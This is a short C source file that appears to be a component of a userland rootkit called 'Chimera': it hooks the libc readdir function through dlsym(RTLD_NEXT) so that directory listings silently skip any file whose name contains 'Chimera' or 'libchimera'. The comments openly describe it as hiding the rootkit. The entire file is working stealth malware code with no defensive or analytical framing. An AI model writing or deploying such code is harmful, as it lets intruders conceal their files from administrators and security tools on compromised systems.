#define _GNU_SOURCE
#include <stdio.h>
#include <dirent.h>
#include <string.h>
#include <dlfcn.h>
#include <stddef.h>

/*
 * This is the hooked version of readdir. 
 * It intercepts directory listing requests and filters out our project.
 */
struct dirent *readdir(DIR *dirp) {
    // Pointer to the REAL readdir function
    struct dirent *(*real_readdir)(DIR *dirp);
    
    // Look up the next readdir in the library load order (the real libc version)
    real_readdir = dlsym(RTLD_NEXT, "readdir");

    struct dirent *entry;

    // Iteratively call the real readdir
    while ((entry = real_readdir(dirp)) != NULL) {
        // If the filename contains "Chimera" or the rootkit name, hide it
        if (strstr(entry->d_name, "Chimera") == NULL && 
            strstr(entry->d_name, "libchimera") == NULL) {
            return entry;
        }
        // Match found! Skipping this entry to make it invisible
    }

    return NULL;
}
